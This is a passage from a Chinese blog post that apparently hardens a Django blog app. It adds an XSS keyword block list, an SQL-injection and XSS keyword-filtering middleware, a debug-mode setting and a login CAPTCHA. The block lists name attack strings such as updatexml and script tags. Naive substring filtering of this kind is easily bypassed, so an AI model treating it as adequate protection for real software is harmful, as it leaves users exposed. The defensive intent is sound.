<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">forbidden_keywords = [</span><br><span class="line">    <span class="string">&quot;script&quot;</span>, <span class="string">&quot;iframe&quot;</span>, <span class="string">&quot;object&quot;</span>, <span class="string">&quot;embed&quot;</span>, <span class="string">&quot;applet&quot;</span>, <span class="string">&quot;meta&quot;</span>,</span><br><span class="line">    <span class="string">&quot;onabort&quot;</span>, <span class="string">&quot;onactivate&quot;</span>, <span class="string">&quot;onafterprint&quot;</span>, <span class="string">&quot;onafterscriptexecute&quot;</span>,</span><br><span class="line">    <span class="string">&quot;onbeforeactivate&quot;</span>, <span class="string">&quot;onbeforecopy&quot;</span>, <span class="string">&quot;onbeforecut&quot;</span>, <span class="string">&quot;onbeforedeactivate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;onbeforepaste&quot;</span>, <span class="string">&quot;onbeforescriptexecute&quot;</span>, <span class="string">&quot;onblur&quot;</span>, <span class="string">&quot;oncanplay&quot;</span>,</span><br><span class="line">    <span class="string">&quot;oncanplaythrough&quot;</span>, <span class="string">&quot;onchange&quot;</span>, <span class="string">&quot;onclick&quot;</span>, <span class="string">&quot;oncontextmenu&quot;</span>, <span class="string">&quot;oncopy&quot;</span>,</span><br><span class="line">    <span class="string">&quot;oncuechange&quot;</span>, <span class="string">&quot;oncut&quot;</span>, <span class="string">&quot;ondblclick&quot;</span>, <span class="string">&quot;ondeactivate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ondrag&quot;</span>, <span class="string">&quot;ondragend&quot;</span>, <span class="string">&quot;ondragenter&quot;</span>, <span class="string">&quot;ondragleave&quot;</span>, <span class="string">&quot;ondragover&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ondragstart&quot;</span>, <span class="string">&quot;ondrop&quot;</span>, <span class="string">&quot;ondurationchange&quot;</span>, <span class="string">&quot;onemptied&quot;</span>, <span class="string">&quot;onended&quot;</span>,</span><br><span class="line">    <span class="string">&quot;onerror&quot;</span>, <span class="string">&quot;onfocus&quot;</span>, <span class="string">&quot;onhashchange&quot;</span>, <span class="string">&quot;oninput&quot;</span>,</span><br><span class="line">    <span class="string">&quot;oninvalid&quot;</span>, <span class="string">&quot;onkeydown&quot;</span>, <span class="string">&quot;onkeypress&quot;</span>, <span class="string">&quot;onkeyup&quot;</span>, <span class="string">&quot;onload&quot;</span>,</span><br><span class="line">    <span class="string">&quot;onloadeddata&quot;</span>, <span class="string">&quot;onloadedmetadata&quot;</span>, <span class="string">&quot;onloadstart&quot;</span>, <span class="string">&quot;onmessage&quot;</span>, <span class="string">&quot;onmousedown&quot;</span>,</span><br><span class="line">    <span class="string">&quot;onmousemove&quot;</span>, <span class="string">&quot;onmouseout&quot;</span>, <span class="string">&quot;onmouseover&quot;</span>, <span class="string">&quot;onmouseup&quot;</span>, <span class="string">&quot;onmousewheel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;onoffline&quot;</span>, <span class="string">&quot;ononline&quot;</span>, <span class="string">&quot;onpagehide&quot;</span>, <span class="string">&quot;onpageshow&quot;</span>, <span class="string">&quot;onpaste&quot;</span>,</span><br><span class="line">    <span class="string">&quot;onpause&quot;</span>, <span class="string">&quot;onplay&quot;</span>, <span class="string">&quot;onplaying&quot;</span>, <span class="string">&quot;onpopstate&quot;</span>, <span class="string">&quot;onprogress&quot;</span>,</span><br><span class="line">    <span class="string">&quot;onratechange&quot;</span>, <span class="string">&quot;onreadystatechange&quot;</span>, <span class="string">&quot;onreset&quot;</span>, <span class="string">&quot;onscroll&quot;</span>, <span class="string">&quot;onsearch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;onseeked&quot;</span>, <span class="string">&quot;onseeking&quot;</span>, <span class="string">&quot;onselect&quot;</span>, <span class="string">&quot;onshow&quot;</span>, <span class="string">&quot;onstalled&quot;</span>,</span><br><span class="line">    <span class="string">&quot;onsubmit&quot;</span>, <span class="string">&quot;onsuspend&quot;</span>, <span class="string">&quot;ontimeupdate&quot;</span>, <span class="string">&quot;onunload&quot;</span>, <span class="string">&quot;onvolumechange&quot;</span>,</span><br><span class="line">    <span class="string">&quot;onwaiting&quot;</span>, <span class="string">&quot;alert&quot;</span>, <span class="string">&quot;prompt&quot;</span>, <span class="string">&quot;confirm&quot;</span>, <span class="string">&quot;xss&quot;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>或者更加方便一点，你可以直接在中间件上进行拦截请求包</p>
<p><code>djangoblog/settings.py</code></p>
<p><img src="https://s1.ax1x.com/2023/05/30/p9jMhND.png"></p>
<p>下面这里添加拦截内容，</p>
<p><img src="https://s1.ax1x.com/2023/05/30/p9jMo3d.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OnlineMiddleware</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_request</span>(<span class="params">self, request</span>):</span><br><span class="line">		<span class="keyword">pass</span> </span><br><span class="line">   </span><br><span class="line">我想在中间件这里进行攻击防御，对SQL注入，XSS等内容进行拦截，即如果请求包中包含列表[<span class="string">&quot;database()&quot;</span>,<span class="string">&quot;user()&quot;</span>,<span class="string">&quot;updatexml&quot;</span>,<span class="string">&quot;&lt;script&gt;&quot;</span>]内的值则返回状态码<span class="number">400</span>，禁止发送这个请求包</span><br></pre></td></tr></table></figure>

<p>但是我们不必在process_request方法内写，在 Django 中间件中，每个中间件类都必须提供一个 <code>__call__</code> 方法。当请求到达服务器时，Django 会依次调用每个中间件的 <code>__call__</code> 方法，并将请求对象作为参数传递给它们</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j1LHx"><img src="https://s1.ax1x.com/2023/05/30/p9j1LHx.png" alt="p9j1LHx.png"></a></p>
<p>如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, request</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;batman123&quot;</span>)</span><br><span class="line">    <span class="comment"># 预定义的特定关键字列表</span></span><br><span class="line">    forbidden_keywords = [<span class="string">&quot;database&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;updatexml&quot;</span>, <span class="string">&quot;script&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查请求包中是否包含任何一个特定关键字</span></span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> forbidden_keywords:</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> <span class="built_in">str</span>(request.body).lower():</span><br><span class="line">            <span class="comment"># 如果发现请求包中包含特定关键字，则返回 400 错误</span></span><br><span class="line">            <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Bad Request&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果请求包中不包含特定关键字，则继续处理该请求</span></span><br><span class="line">    response = self.get_response(request)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j3m8g"><img src="https://s1.ax1x.com/2023/05/30/p9j3m8g.png" alt="p9j3m8g.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j3V58"><img src="https://s1.ax1x.com/2023/05/30/p9j3V58.png" alt="p9j3V58.png"></a></p>
<p>如下，请求包中包含script，就会被拦截</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j3MKs"><img src="https://s1.ax1x.com/2023/05/30/p9j3MKs.png" alt="p9j3MKs.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j3ePS"><img src="https://s1.ax1x.com/2023/05/30/p9j3ePS.png" alt="p9j3ePS.png"></a></p>
<p>到此为止通过markdown打XSS和中间件的过滤拦截修复已经完成，其他可能存在存在XSS的漏洞作者修复时可疑选择完善XSS拦截列表即可，接下来看其他功能</p>
<h4 id="判断伪静态是否存在SQL注入"><a href="#判断伪静态是否存在SQL注入" class="headerlink" title="判断伪静态是否存在SQL注入"></a>判断伪静态是否存在SQL注入</h4><p>这里我们还是在主路由-&gt;blog这个分路由</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j8MWD"><img src="https://s1.ax1x.com/2023/05/30/p9j8MWD.png" alt="p9j8MWD.png"></a></p>
<p>发现这个文章详情这里，11这个article_id猜测可能存在注入，跟进这个类视图（ArticleDetailView）查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8000/article/2023/5/29/11.html</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j83yd"><img src="https://s1.ax1x.com/2023/05/30/p9j83yd.png" alt="p9j83yd.png"></a></p>
<p>这里在类视图内，定义了模板，模型，主键，上下文传递的参数名，以及get_object()和get_context_data()方法</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j8tTP"><img src="https://s1.ax1x.com/2023/05/30/p9j8tTP.png" alt="p9j8tTP.png"></a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_object</span>(<span class="params">self, queryset=<span class="literal">None</span></span>):</span><br><span class="line">    obj = <span class="built_in">super</span>(ArticleDetailView, self).get_object()</span><br><span class="line">    obj.viewed()</span><br><span class="line">    self.<span class="built_in">object</span> = obj</span><br><span class="line">    <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure>

<p>在get_object方法中，它返回模型类的单个实例，并将其作为上下文变量 <code>object</code> 传递给模板文件</p>
<p>在这个方法中，我们首先调用父类的 <code>get_object()</code> 方法来获取默认的对象。然后，我们调用 <code>viewed()</code> 方法来增加文章的阅读数。最后，我们将该对象设置为当前视图处理函数的属性 <code>self.object</code>，并将其返回。</p>
<p><code>get_object()</code> 方法将自动使用该参数来查找对应的 <code>Article</code> 实例。具体地，Django 将使用 <code>Article.objects.get(pk=article_id)</code> 查询数据库来获取对应的 <code>Article</code> 实例。</p>
<p>采用了内置的ORM语法，故不存在SQL注入</p>
<h4 id="上线部署后关闭debug模式【随意】"><a href="#上线部署后关闭debug模式【随意】" class="headerlink" title="上线部署后关闭debug模式【随意】"></a>上线部署后关闭debug模式【随意】</h4><p>将<code>djangoblog/settings.py</code>内的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEBUG = env_to_bool(&#x27;DJANGO_DEBUG&#x27;, False)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j8IX9"><img src="https://s1.ax1x.com/2023/05/30/p9j8IX9.png" alt="p9j8IX9.png"></a></p>
<h4 id="登陆，注册，忘记密码功能可爆破"><a href="#登陆，注册，忘记密码功能可爆破" class="headerlink" title="登陆，注册，忘记密码功能可爆破"></a>登陆，注册，忘记密码功能可爆破</h4><p>登陆功能可爆破，注册功能可爆破</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jJuxe"><img src="https://s1.ax1x.com/2023/05/30/p9jJuxe.png" alt="p9jJuxe.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jY70s"><img src="https://s1.ax1x.com/2023/05/30/p9jY70s.png" alt="p9jY70s.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jYH7n"><img src="https://s1.ax1x.com/2023/05/30/p9jYH7n.png" alt="p9jYH7n.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jYLt0"><img src="https://s1.ax1x.com/2023/05/30/p9jYLt0.png" alt="p9jYLt0.png"></a></p>
<p>修复方案：</p>
<p>增加验证码功能</p>
<p>先配置好忘记密码时找回密码的邮箱设置<code>djangoblog/settings.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Email:</span></span><br><span class="line">EMAIL_BACKEND = <span class="string">&#x27;django.core.mail.backends.smtp.EmailBackend&#x27;</span></span><br><span class="line">EMAIL_USE_TLS = env_to_bool(<span class="string">&#x27;DJANGO_EMAIL_TLS&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">EMAIL_USE_SSL = env_to_bool(<span class="string">&#x27;DJANGO_EMAIL_SSL&#x27;</span>, <span class="literal">True</span>)</span><br><span class="line">EMAIL_HOST = <span class="string">&#x27;smtp.163.com&#x27;</span></span><br><span class="line">EMAIL_PORT = <span class="number">465</span></span><br><span class="line">EMAIL_HOST_USER = <span class="string">&#x27;batmanfuture111111@163.com&#x27;</span></span><br><span class="line">EMAIL_HOST_PASSWORD = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">DEFAULT_FROM_EMAIL = EMAIL_HOST_USER</span><br><span class="line">SERVER_EMAIL = EMAIL_HOST_USER</span><br><span class="line"><span class="comment"># Setting debug=false did NOT handle except email notifications</span></span><br><span class="line">ADMINS = [(<span class="string">&#x27;管理员&#x27;</span>, <span class="string">&#x27;batmanfuture111111@163.com&#x27;</span>)]</span><br></pre></td></tr></table></figure>

<p>在任意一个文章下面评论，发送邮件</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jNlqJ"><img src="https://s1.ax1x.com/2023/05/30/p9jNlqJ.png" alt="p9jNlqJ.png"></a></p>
<p>定位到<code>accounts/urls.py</code>中，存在login，register，forget_password等功能</p>
<p>登陆</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re_path(<span class="string">r&#x27;^login/$&#x27;</span>,views.LoginView.as_view(success_url=<span class="string">&#x27;/&#x27;</span>),</span><br></pre></td></tr></table></figure>

<p>在LoginView类视图内，用的是<code>account/login.html</code>模板</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jNsII"><img src="https://s1.ax1x.com/2023/05/30/p9jNsII.png" alt="p9jNsII.png"></a></p>
<p>我们这里在这里输出here_i_am，在登陆页面就会展示，故我们打算将验证码功能放在这里</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jNOQU"><img src="https://s1.ax1x.com/2023/05/30/p9jNOQU.png" alt="p9jNOQU.png"></a></p>
<p>另外，登陆功能这里采用的是用form表单的形式 + form组件发送请求和处理</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jNjL4"><img src="https://s1.ax1x.com/2023/05/30/p9jNjL4.png" alt="p9jNjL4.png"></a></p>
<p>在<code>templates/account/login.html</code>中添加如下代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">--------------</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;&quot;</span>&gt;</span>验证码<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-6&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;code&quot;</span> <span class="attr">id</span>=<span class="string">&quot;id_code&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-6&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/get_code/&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;50&quot;</span> <span class="attr">id</span>=<span class="string">&quot;id_img&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">$(<span class="string">&quot;#id_img&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 1 先获取标签之前的src</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> oldVal = $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>,oldVal += <span class="string">&#x27;?&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jUrXF"><img src="https://s1.ax1x.com/2023/05/30/p9jUrXF.png" alt="p9jUrXF.png"></a></p>
<p>在总urls.py中添加get_code路由<code>djangoblog/urls.py</code>，或者在accounts/urls.py中添加，我们选后者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re_path(<span class="string">r&#x27;^get_code/&#x27;</span>, views.get_code, name=<span class="string">&#x27;gc&#x27;</span>),</span><br></pre></td></tr></table></figure>

<p>但是在此之前我们应该先分析LoginView类视图</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9ja141"><img src="https://s1.ax1x.com/2023/05/30/p9ja141.png" alt="p9ja141.png"></a></p>
<p>这里我们<code>form_class = LoginForm</code>，跟进去，标准的form组件</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9ja45n"><img src="https://s1.ax1x.com/2023/05/30/p9ja45n.png" alt="p9ja45n.png"></a></p>
<p>然后回过来调用form_valid方法处理表单数据</p>
<p>我们创建了一个新的 <code>AuthenticationForm</code> 实例，将其传递给 <code>auth.login()</code> 函数进行验证</p>
<p>也就是说当我们验证登陆成功后，返回<code>super(LoginView, self).form_valid(form)</code></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j0T2t"><img src="https://s1.ax1x.com/2023/05/30/p9j0T2t.png" alt="p9j0T2t.png"></a></p>
<p>我这里是先判断验证码是否正确，然后判断账户密码，</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jhX6g"><img src="https://s1.ax1x.com/2023/05/30/p9jhX6g.png" alt="p9jhX6g.png"></a><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jhz0s"><img src="https://s1.ax1x.com/2023/05/30/p9jhz0s.png" alt="p9jhz0s.png"></a></p>
<p>以下是增加代码</p>
<p>accounts/urls.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re_path(r&#x27;^get_code/&#x27;, views.get_code, name=&#x27;gc&#x27;),</span><br></pre></td></tr></table></figure>

<p>templates/account/login.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;form-signin&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&#123;% url &#x27;account:login&#x27; %&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">                &#123;% csrf_token %&#125;</span><br><span class="line">                &#123;% comment %&#125;<span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;inputEmail&quot;</span> <span class="attr">class</span>=<span class="string">&quot;sr-only&quot;</span>&gt;</span>Email address<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">id</span>=<span class="string">&quot;inputEmail&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Email&quot;</span> <span class="attr">required</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;inputPassword&quot;</span> <span class="attr">class</span>=<span class="string">&quot;sr-only&quot;</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;inputPassword&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span> <span class="attr">required</span>&gt;</span>&#123;% endcomment %&#125;</span><br><span class="line">                &#123;&#123; error_msg &#125;&#125;</span><br><span class="line">                &#123;&#123; form.non_field_errors &#125;&#125;</span><br><span class="line">                &#123;% for field in form %&#125;</span><br><span class="line">                    &#123;&#123; field &#125;&#125;</span><br><span class="line">                    &#123;&#123; field.errors &#125;&#125;</span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;&quot;</span>&gt;</span>验证码<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-6&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;code&quot;</span> <span class="attr">id</span>=<span class="string">&quot;id_code&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-6&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/get_code/&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;50&quot;</span> <span class="attr">id</span>=<span class="string">&quot;id_img&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;next&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; redirect_to &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-lg btn-primary btn-block&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Sign in<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span></span><br><span class="line">                    &#123;% comment %&#125;<span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;pull-right&quot;</span>&gt;</span>Need help?<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#123;% endcomment %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;remember-me&quot;</span> <span class="attr">name</span>=<span class="string">&quot;remember&quot;</span>&gt;</span> Stay signed in</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;% load oauth_tags %&#125;</span><br><span class="line">                &#123;% load_oauth_applications request%&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>accounts/views.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO, StringIO</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> messages</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 